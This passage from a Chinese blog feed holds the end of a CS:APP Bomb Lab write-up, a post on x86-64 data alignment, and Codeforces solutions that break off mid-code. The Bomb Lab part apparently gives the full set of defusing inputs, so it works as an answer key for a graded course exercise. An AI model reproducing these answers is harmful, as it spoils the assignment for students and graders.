class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span>* a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(a==<span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> y=*a;</span><br><span class="line">  <span class="keyword">if</span>(y==b)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(y&lt;b)</span><br><span class="line">  &#123;</span><br><span class="line">    a=*(a+<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">int</span> q=fun7(a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*q+<span class="number">1</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    a=*(a+<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">int</span> q=fun7(a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*q;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细理一下思路，如果a是空指针返回－１，否则比较a处的值和b的关系，相等返回0，其他情况在往后走8字节或者16字节然后<strong>取出当前的值作为地址</strong>。而我们要的结果是２，只需要构造一个返回值为２的情况就行了!打印a初始值表示的地址附近的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/128d 0x6030f0</span><br><span class="line">0x6030f0 &lt;n1&gt;:36063040160</span><br><span class="line">0x603100 &lt;n1+16&gt;:6304048000</span><br><span class="line">0x603110 &lt;n21&gt;:8063041440</span><br><span class="line">0x603120 &lt;n21+16&gt;:6304080000</span><br><span class="line">0x603130 &lt;n22&gt;:50063041120</span><br><span class="line">0x603140 &lt;n22+16&gt;:6304176000</span><br><span class="line">0x603150 &lt;n32&gt;:22063043680</span><br><span class="line">0x603160 &lt;n32+16&gt;:6304304000</span><br><span class="line">0x603170 &lt;n33&gt;:45063042080</span><br><span class="line">0x603180 &lt;n33+16&gt;:6304400000</span><br><span class="line">0x603190 &lt;n31&gt;:6063042400</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:6304336000</span><br><span class="line">0x6031b0 &lt;n34&gt;:107063042720</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:6304432000</span><br><span class="line">0x6031d0 &lt;n45&gt;:40000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:0000</span><br><span class="line">0x6031f0 &lt;n41&gt;:1000</span><br><span class="line">0x603200 &lt;n41+16&gt;:0000</span><br><span class="line">0x603210 &lt;n47&gt;:99000</span><br><span class="line">0x603220 &lt;n47+16&gt;:0000</span><br><span class="line">0x603230 &lt;n44&gt;:35000</span><br><span class="line">0x603240 &lt;n44+16&gt;:0000</span><br><span class="line">0x603250 &lt;n42&gt;:7000</span><br><span class="line">0x603260 &lt;n42+16&gt;:0000</span><br><span class="line">0x603270 &lt;n43&gt;:20000</span><br><span class="line">0x603280 &lt;n43+16&gt;:0000</span><br><span class="line">0x603290 &lt;n46&gt;:47000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:0000</span><br><span class="line">0x6032b0 &lt;n48&gt;:1001000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:0000</span><br></pre></td></tr></table></figure><p>首先断定一定是$y=b$才能跳出递归，其次$b\leq 1001$总是成立,而且因为每一次递归结果都会至少翻一倍，所以猜测结果一定在不远处。那么我们只考虑8的倍数的地址，一个一个看过去看到22的时候发现，22的时候返回值刚好是2!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&apos;s number 2.  Keep going!</span><br><span class="line">0 207</span><br><span class="line">Halfway there!</span><br><span class="line">7 0 DrEvil</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">ionefg</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">Curses, you&apos;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br><span class="line">22</span><br><span class="line">Wow! You&apos;ve defused the secret stage!</span><br><span class="line">Congratulations! You&apos;ve defused the bomb!</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个实验非常有意思，花了我两天时间来完成，一开始耐性还不错，直接读汇编去找答案，但是到第六关真的崩溃了，这么长一段汇编，读了快一个小时，分析出输入的数字必须是1-6，然后找到了一个莫名奇妙的地址之后实在是心态爆炸，于是去参考了<a href="https://wdxtub.com/2016/04/16/thick-csapp-lab-2/" target="_blank" rel="noopener">不周山Lab解析</a>，这也是本次实验最大的遗憾之处<del>最大的黑点</del>，没有完全独立自主的完成。假期也快要结束，csapp之旅却还刚刚开始!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BoomLab&quot;&gt;&lt;a href=&quot;#BoomLab&quot; class=&quot;headerlink&quot; title=&quot;BoomLab&quot;&gt;&lt;/a&gt;BoomLab&lt;/h1&gt;&lt;p&gt;这个实验非常有意思，需要利用csapp里面第三章学到的x86-64汇编知识以及一些逆向的技巧，来破解
      
    
    </summary>
    
      <category term="csapp" scheme="lengyu.me/categories/csapp/"/>
    
    
      <category term="csapp" scheme="lengyu.me/tags/csapp/"/>
    
      <category term="工程向" scheme="lengyu.me/tags/%E5%B7%A5%E7%A8%8B%E5%90%91/"/>
    
      <category term="计算机体系" scheme="lengyu.me/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
  </entry>
  
  <entry>
    <title>CS:APP 第三章-数据对齐</title>
    <link href="lengyu.me/2018/08/19/CS:APP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%AF%B9%E9%BD%90/"/>
    <id>lengyu.me/2018/08/19/CS:APP-第三章-数据对齐/</id>
    <published>2018-08-19T11:11:38.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CS-APP-第三章-数据对齐"><a href="#CS-APP-第三章-数据对齐" class="headerlink" title="CS:APP 第三章-数据对齐"></a>CS:APP 第三章-数据对齐</h1><p>对于数据对齐的介绍，书中是这样阐述的</p><blockquote><p>许多计算机系统对基本数据类型的合法地址做出了一些限制，要求某种类型对象的地址必须是某个值K（通常是2、4或者8）的倍数。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。例如，假设一个处理器总是从内存中取8个字节，则地址必须为8的倍数。如果我们能保证将所有的double类型数据的地址对齐成8的倍数，那么就可以用一个内存操作来读或者写值了。否则，我们可能需要执行两次内存访问，因为对象可能被分放在两个8字节的内存块中。</p></blockquote><blockquote><p>无论数据是否对其，x86-64硬件都能正确的工作。不过，Intel还是建议要对其数据以提高内存系统的性能。对其原则是任何K字节的基本对象的地址必须是K的倍数。可以看到这条原则会得到如下对齐</p></blockquote><blockquote><table><thead><tr><th>k</th><th>类型</th></tr></thead><tbody><tr><td>1</td><td>char</td></tr><tr><td>2</td><td>short</td></tr><tr><td>4</td><td>int,float</td></tr><tr><td>8</td><td>long,double,char*</td></tr></tbody></table></blockquote><p>特别的，在旁注中提到强制对齐的情况，这对后面的一个问题会有所帮助。</p><blockquote><p>对于大多数x86-64指令来说，保持数据对齐能够提高效率，但是它不会影响程序的行为。另一方面，如果数据没有对齐，某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，就无法正确执行。这些指令对16字节的数据块进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。任何试图不满足对齐要求的地址来访问内存都会导致异常，默认的行为是程序终止。<br>因此，任何针对x86-64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或者写的数据结构的内存，都必须满足16字节对齐。这个要求有两个后果:<br>*任何内存分配函数(alloca、malloc、calloc或者realloc)生成的块的起始位置都必须是16的倍数<br>*大多数函数的栈帧的边界都必须是16字节的倍数。（这个要求有一些例外）。</p></blockquote><p>基于以上资料，可以给出一个内存对齐的例子，比如说，考虑下面的结构声明:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设编译器用最小的9字节分配，那么S1.i的偏移地址为0，S1.c的偏移地址是4，S1.j的偏移地址是5，总共大小为9字节。如果考虑默认情况下S1.i满足内存地址是4的倍数的话，j一定不会满足这一要求。于是考虑往c后面留出一个空余位置，让j的偏移地址变为8，也就是c和j的中间保留3个字节不填充内容，这样总共大小为12，满足对齐要求。再考虑另外一种情况</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S2</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能你也会想让i偏移地址为0,j为4,c为8，这样能保证i,j,c都满足对齐要求并且可以打包为9字节。但是如果你考虑这样一个声明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S2</span> <span class="title">d</span>[4];</span></span><br></pre></td></tr></table></figure><p>因为数组的空间是连续的，如果采用我们上述所说的9字节打包情况，就不能满足对齐要求了，于是编译器可能会在c的后面插入3字节的空余空间，打包为12字节，以保证满足对齐要求。</p><p>为了防止读者忘记栈的相关情况，对其进行一些说明</p><blockquote><p>在x86-64体系中，栈是向低地址生长的，栈顶处于低地址，而栈底处于高地址</p></blockquote><p>在后续的3.10.5章节(支持变长栈帧)中有这样一个涉及到数据对齐的实际情况。</p><blockquote><p>下续代码给出了一个包含变长数组的例子。该函数声明了n个指针的局部数组p。这里n由第一个参数给出。这要求在栈上分配8n个字节，这里的n的值每次调用该函数时都不同。因此编译器无法确定要给该函数的栈帧分配多少空间。此外，改程序还产生一个队局部变量i的地址的引用，因此该变量必须存储在栈中。在执行工程中，程序必须能够访问局部变量i和数组p的元素。返回时，股函数必须释放这个栈帧，并将栈指针设置为存储返回地址的位置  </p></blockquote><p>c代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">vframe</span><span class="params">(<span class="keyword">long</span> n,<span class="keyword">long</span> idx,<span class="keyword">long</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> *p[n];</span><br><span class="line">  p[<span class="number">0</span>]=&amp;i;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    p[i]=q;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *p[idx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的<strong>部分</strong>汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">long vFrame(long n,long idx,long *q)</span><br><span class="line">n in $rdi, idx in %rsi, q in %rdx</span><br><span class="line">Only portions of code shown</span><br><span class="line"></span><br><span class="line">Vframe:</span><br><span class="line">  pushq %rbp</span><br><span class="line">  movq  %rsp,%rbp</span><br><span class="line">  subq  $16,%rsp</span><br><span class="line">  leaq  22(,%rdi,8),%rax</span><br><span class="line">  and1  $-16,%rax</span><br><span class="line">  subq  %rax,%rsp</span><br><span class="line">  leaq  7(%rsp),%rax</span><br><span class="line">  shrq  $3,%rax</span><br><span class="line">  leaq  0(,%rax,8),%r8</span><br><span class="line">  movq  %r8,%</span><br></pre></td></tr></table></figure><p>我们现在来考虑这段代码是如何实现内存数据对齐的。事实上这是练习题3.49，为了保证完整性，我列出这道习题。</p><blockquote><p>练习题3.49 在这道题中，我们要探究附图(图3-44，因为没有找到图源，所以需要自行到书第203页查看)和上述汇编代码中第5-11行（我列出的部分）背后的逻辑，它分配了变长大小的数组p。正如代码的注释表明，$s_1$表示执行第四行(从Vframe开始数，Vframe为第一行)subq指令之后的栈指针地址。这条指令为局部变量i分配空间。$s_2$表示执行第七行的subq指令之后的栈指针的值。这条指令为局部数据p分配存储。最后,$p$表示第10-11行指令赋给%r8和%rcx的值。这两个寄存器都用来引用数组p。<br>附图的邮编画出了$s_1$、$s_2$和指针$p$指示的位置。图中还画出了$s_2$和$p$的值之间可能有一个偏移量为$e_2$字节的位置，该空间是未被使用的。数组$p$的结尾和$s_1$指示的位置之间还可能有一个偏移量为$e_1$字节的地方。</p></blockquote><p>对于下面$n$和$s_1$的值，跟踪代码的执行，确定$s_2$、$p$、$e_1$和$e_2$的结果值。</p><table><thead><tr><th>n</th><th>$s_1$</th><th>$s_2$</th><th>$p$</th><th>$e_1$</th><th>$e_2$</th></tr></thead><tbody><tr><td>5</td><td>2065</td><td>2017</td><td>2024</td><td>1</td><td>7</td></tr><tr><td>6</td><td>2064</td><td>2000</td><td>2000</td><td>16</td><td>0</td></tr></tbody></table><p>首先给出我的结论，这段代码对$p$提供了进行8字节对齐的属性，对$s_2$提供了和$s$一样的对齐属性。考虑$s_2$的情况，代码第6行是这样写到的</p><blockquote><p>andq $-16,%rax</p></blockquote><p>显然这里的$-16$是一个掩码，其二进制表示为$111\cdots110000$也就是末尾四位为0，其余为1。进行与操作就能将%rax末尾4位置清空，而末尾4位是十进制中$0-15$的表示位，于是这一操作在%rax大于0的时候等价于</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax=rax-rax%<span class="number">16</span>;</span><br></pre></td></tr></table></figure><p>将%rax向下调整成了16的倍数，而Intel的x86体系中基本数据类型不会超过16字节(进行浮点运算时的拓展)。于是这就保证了$s_2$拥有和$s_1$相同的对齐方式。<br>接着我们考虑$p$的情况，$p$是一个指针，这就要求他如果进行数据对齐就应该对齐到8字节。汇编代码的第8-10行进行了这个处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leaq  7(%rsp),%rax</span><br><span class="line">shrq  $3,%rax</span><br><span class="line">leaq  0(,%rax,8),%r8</span><br></pre></td></tr></table></figure><p>这一操作等价于如下c代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rax=rsp+<span class="number">7</span>;</span><br><span class="line">rax=rax/<span class="number">8</span>;</span><br><span class="line">r8=<span class="number">8</span>*rax;</span><br></pre></td></tr></table></figure><p>注意第二第三行，在大于0的时候，先除8再乘8在c语言里面不是不变，而是向下取到8的倍数(也就是减掉模数),而先将%rax值加上7再进行这个操作则可以将值设置为设置为大于%rax的最靠近%rax的8的倍数。至此，性质的讨论结束，但是可以进行一些更细致的思考。<br>现在来考虑第五行，为什么要先加上22再执行对掩码16按位与的操作。对第五行进行等价变形,我们假设$n=2k+r$其中$r$是余数,只有0、1两种取值,那么有$8n+22=8*(2k+r)+22=16k+8r+22=16k+8r+16+6=16(k+1)+8r+6$，再考虑进行汇编第五行的操作那么有$(8n+22)=16(k+1)+8r+6$,而不论$r=0$或者$r=1$，$8r+6&lt;16$都总是成立，于是这个值对-16按位与的结果显然为$16(k+1)$，我们将结果改造一下，因为$n=2k+r$,这样$16(k+1)=8n+16-8r$，也就是说，这段代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> *p[n];</span><br></pre></td></tr></table></figure><p>分配到的空间为$8n+16-8r$,考虑$n$为偶数的时候，分配的空间多了16，考虑n为奇数的时候，分配到的空间多了$8$。这是基于让结果为$16$的倍数的缘故。如果$n$为奇数，显然为了让分配的空间为$16$的倍数，则必须补齐$8$字节，当$n$为偶数的时候，本身分配的空间就是$16$的倍数了，没有必要补齐,但是！因为要让后面的$p$保持8字节对齐，如果$s_1$的值不是8字节对齐的，那么如果我们恰好的分配了$8n$个空间，则显然可以看到这个空间里面的$p$一定不是8字节对齐的，而且如果要对$p$的位置在$s_2$的基础上进行调整，则没有了任何余地，因为分配到的空间只有$8n$，这段空间要用于存放$n$个指针数组，这段空间没有阉割的余地，于是乎需要多分配$16$字节的空间，为后面$p$进行调整留下余地。事实上我们往后看到对$p$进行调整的逻辑的时候就会发现，$p$的调整是去找大于$s_2$的第一个$8$的倍数的地址，这也就是说分配空间的时候要留有余地，否则进行调整就会减小到存放$8n$大小的数组的空间，导致没有分配到足够的空间。<br>简单的来说，也就是如果要进行$k$字节的对齐，那么不论之前的位置如何，只要多分配$k$字节的空间，都能进行相关的调整来满足对齐条件。而上述要求$s_2$要与$s_1$满足相同的对齐条件，那么就需要多分配$16$字节的空间。但这只是最差的情况，由于我们需要的空间为$8n$，本身是8的倍数，假设起始位置为$s_1=16k_1+r$其中$0\leq r \leq 15$，那么假设要多分配$x$空间才能让对齐方式一致，也就是$x+8n+s_1=16k_2+r$,而我们可以进行这样的变换$x+8n+s_1=x+8n+16k_1+r$</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CS-APP-第三章-数据对齐&quot;&gt;&lt;a href=&quot;#CS-APP-第三章-数据对齐&quot; class=&quot;headerlink&quot; title=&quot;CS:APP 第三章-数据对齐&quot;&gt;&lt;/a&gt;CS:APP 第三章-数据对齐&lt;/h1&gt;&lt;p&gt;对于数据对齐的介绍，书中是这样阐述的
      
    
    </summary>
    
      <category term="csapp" scheme="lengyu.me/categories/csapp/"/>
    
    
      <category term="csapp" scheme="lengyu.me/tags/csapp/"/>
    
      <category term="工程向" scheme="lengyu.me/tags/%E5%B7%A5%E7%A8%8B%E5%90%91/"/>
    
      <category term="计算机体系" scheme="lengyu.me/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
  </entry>
  
  <entry>
    <title>Codeforces Round #504</title>
    <link href="lengyu.me/2018/08/18/Codeforces-Round-504/"/>
    <id>lengyu.me/2018/08/18/Codeforces-Round-504/</id>
    <published>2018-08-18T01:01:01.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Codeforces-Round-504"><a href="#Codeforces-Round-504" class="headerlink" title="Codeforces Round #504"></a>Codeforces Round #504</h1><p>好久没有写算法题了，直接血崩，头脑都不清醒了，xjr写，最后st还被x掉两道。不过这场比赛based on VK Cup 2018 final，质量还是不错的，有时间还会继续补题。</p><h2 id="Single-Wildcard-Pattern-Matching"><a href="#Single-Wildcard-Pattern-Matching" class="headerlink" title="Single Wildcard Pattern Matching"></a>Single Wildcard Pattern Matching</h2><p>红名也是一大片A题被X有木有见过！这道题我没有掉坑里面结果tmd写的太丑了，居然t掉了…血亏。其实这道题很简单，给两个串，第一个串<strong>可能有最多一个</strong>*，一定要注意这一点，可能有，可能没有，可能出现在第一个位置，也可能出现在最后一个位置，然后*可以表示成任何字符串，包括空串，问两个字符串是否匹配。首先把第一个串拆成两个部分*之前和之后，先看之前的部分是否匹配，然后看之后的部分是否和第二个串的末尾匹配，最后的最后一定要检查一点，就是第二个串末尾匹配的部分不能包含前置匹配的部分。就是说比如第一个串是aaa*ab第二个串是aaab，第一个串前面部分匹配了aaa之后第二个串只剩下b了，b不能匹配ab，所以不行。一定要注意这一点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">2e5</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">char</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> b[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//std::ios::sync_with_stdio(false);</span></span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,&amp;a,&amp;b);</span><br><span class="line"><span class="keyword">int</span> t=<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//int t=find(a,'*');</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(a[i]==<span class="string">'*'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    t=i;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t==<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(a,b)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;t;++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]!=b[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> stp=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="built_in">strlen</span>(a)-t<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> qlen=<span class="built_in">strlen</span>(b);</span><br><span class="line">        <span class="keyword">int</span> ki=<span class="built_in">strlen</span>(b)-k;</span><br><span class="line">        <span class="keyword">if</span>(ki&lt;t)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+t+<span class="number">1</span>]!=b[ki+i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pair-of-Toys"><a href="#Pair-of-Toys" class="headerlink" title="Pair of Toys"></a>Pair of Toys</h2><p>数学题，一定不要暴力。。给两个数字 $n$ ， $m$ 。求 $1$ 到 $n$ 的数字之间有多少组 $(i,j)$ 能够满足 $i+j=m$  。显然我们考虑 $r=\frac{m}{2}$ 那么对于$1$到$r$之间的数字在$r+1$到$n$之间应该都能找到对应的值使得加起来等于$m$，这只是理想情况。现在我们考虑进行分类讨论。举一个简单的例子，比如$8$,$5$这组样例，$r=5/2=2$ 那么就有$(1,4)$，$(2,3)$，两组。但是当$n=3 m=5$ 的时候，虽然$r=2$ 但是对于$(1,4)$这一组$4$已经不在$n$的范围内了。所以当$n&gt;m-1$的时候，结果应该是$r$，当$n &lt; m-1$的时候，结果应该是$n-r$。这是普遍的情况，再考虑一个最特殊的情况，比如当$m=4$ 的时候，$r=2$ ，但是$(2,2)$是不能取到的，于是这种情况应该减少1。最后对无解的情况输出$0$即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span 